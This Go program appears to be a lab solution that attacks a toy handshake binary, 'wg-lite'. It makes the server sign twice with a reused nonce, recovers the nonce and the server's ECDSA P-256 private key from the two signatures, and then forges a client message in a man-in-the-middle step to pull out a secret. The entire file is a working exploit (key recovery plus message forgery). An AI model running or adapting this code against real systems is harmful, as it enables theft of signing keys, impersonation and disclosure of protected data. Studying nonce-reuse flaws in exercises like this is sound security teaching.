package main

import (
	"crypto/elliptic"

	"golang.org/x/crypto/cryptobyte"
	"golang.org/x/crypto/cryptobyte/asn1"

	"github.com/pratik1998/compromiser/mitm"

	"fmt"
	"log"
	"math/big"
	"os"
	"os/exec"
)

type invertible interface {
	// Inverse returns the inverse of k in GF(P)
	Inverse(k *big.Int) *big.Int
}

func hashToInt(hash []byte, c elliptic.Curve) *big.Int {
	orderBits := c.Params().N.BitLen()
	orderBytes := (orderBits + 7) / 8
	if len(hash) > orderBytes {
		hash = hash[:orderBytes]
	}

	ret := new(big.Int).SetBytes(hash)
	excess := len(hash)*8 - orderBits
	if excess > 0 {
		ret.Rsh(ret, uint(excess))
	}
	return ret
}

// From encoded message data it will retrieve the signature, random number and hashed message
func SeparateMsgAndSign(data []byte) (*big.Int, *big.Int, *big.Int) {
	c := elliptic.P256()
	sign_data := make([]byte, len(data))
	copy(sign_data, data)
	sign_length := int(data[len(data)-1]) + 1
	sign := data[len(data)-sign_length : len(data)-1]
	var (
		r, s  = &big.Int{}, &big.Int{}
		inner cryptobyte.String
	)
	input := cryptobyte.String(sign)
	if !input.ReadASN1(&inner, asn1.SEQUENCE) ||
		!input.Empty() ||
		!inner.ReadASN1Integer(r) ||
		!inner.ReadASN1Integer(s) ||
		!inner.Empty() {
		return nil, nil, nil
	}
	msg := hashToInt(sign_data, c)
	return msg, s, r
}

// k = (H(m1) - H(m2)). inv(s1 - s2)
func GetRandomNonce(m1 *big.Int, s1 *big.Int, m2 *big.Int, s2 *big.Int) *big.Int {
	c := elliptic.P256()
	order := c.Params().N
	msg_sub := new(big.Int).Sub(m1, m2)
	msg_sub.Mod(msg_sub, order)
	sign_sub := new(big.Int).Sub(s1, s2)
	sign_sub.Mod(sign_sub, order)
	var sign_sub_inv *big.Int
	if in, ok := c.(invertible); ok {
		sign_sub_inv = in.Inverse(sign_sub)
	}
	msg_sub.Mul(msg_sub, sign_sub_inv)
	msg_sub.Mod(msg_sub, order)
	return msg_sub
}

// private_key = (nonce * s - H(m)) * inv(r)
func GetPrivateKey(m *big.Int, s *big.Int, r *big.Int, nonce *big.Int) *big.Int {
	c := elliptic.P256()
	order := c.Params().N
	private_key := new(big.Int).Mul(nonce, s)
	private_key.Sub(private_key, m)
	private_key.Mod(private_key, order)
	var r_inv *big.Int
	if in, ok := c.(invertible); ok {
		r_inv = in.Inverse(r)
	}
	private_key.Mul(private_key, r_inv)
	private_key.Mod(private_key, order)
	return private_key
}

func main() {
	wg_lite_path := os.Args[1]
	_, err := exec.Command(wg_lite_path, "client", "1", "1", "client-message-1", "server-message-1", "server-message-2").Output()
	if err != nil {
		fmt.Println("Error:", err)
	}
	server_msg_1 := "server-message-1"
	server_msg_1b := "server-message-1b"
	_, err = exec.Command(wg_lite_path, "server", "1", "1", server_msg_1, "client-message-1", "client-message-2").Output()
	if err != nil {
		fmt.Println("Error:", err)
	}
	_, err = exec.Command(wg_lite_path, "server", "2", "1", server_msg_1b, "client-message-1", "client-message-2").Output()
	if err != nil {
		fmt.Println("Error:", err)
	}
	server_data_1a, _ := os.ReadFile(server_msg_1)
	server_data_1b, _ := os.ReadFile(server_msg_1b)
	hash_msg_a, signature_a, r_a := SeparateMsgAndSign(server_data_1a)
	// fmt.Println("Hash Message: ", hash_msg_a)
	// fmt.Println("Signature: ", signature_a)
	// fmt.Println("R(a): ", r_a)
	hash_msg_b, signature_b, _ := SeparateMsgAndSign(server_data_1b)
	// fmt.Println("Hash Message: ", hash_msg_b)
	// fmt.Println("Signature: ", signature_b)
	// fmt.Println("R(b): ", r_b)
	nonce := GetRandomNonce(hash_msg_a, signature_a, hash_msg_b, signature_b)
	// fmt.Println("Random Nounce:", string(nonce.Bytes()))
	private_key := GetPrivateKey(hash_msg_a, signature_a, r_a, nonce)
	// fmt.Println("Private Key: ", private_key)
	_, err = exec.Command(wg_lite_path, "client", "1", "2", "client-message-2", "server-message-1", "server-message-2").Output()
	if err != nil {
		fmt.Println("Error:", err)
	}
	// Man In the Middle Attack to modify the client data to server
	malicious_data := mitm.GenerateEncryptedSecretRequest(private_key, server_data_1a)
	err = os.WriteFile("client-message-2", malicious_data, 0666)
	if err != nil {
		log.Fatal(err)
	}
	_, err = exec.Command(wg_lite_path, "server", "1", "2", "server-message-2", "client-message-1", "client-message-2").Output()
	_, err = exec.Command(wg_lite_path, "client", "1", "3", "client-message-3", "server-message-1", "server-message-2").Output()
	secret, _ := os.ReadFile("client-message-3")
	fmt.Printf("%s", string(secret))
}
